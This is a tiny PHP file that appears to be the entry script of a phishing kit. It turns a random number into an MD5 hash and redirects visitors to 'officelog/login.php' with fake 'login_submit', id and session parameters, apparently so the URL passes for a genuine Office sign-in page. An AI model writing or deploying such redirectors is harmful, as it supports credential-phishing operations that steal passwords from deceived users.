<?php
	
	$praga=rand();
	$praga=md5($praga);

	header("location: officelog/login.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");


?>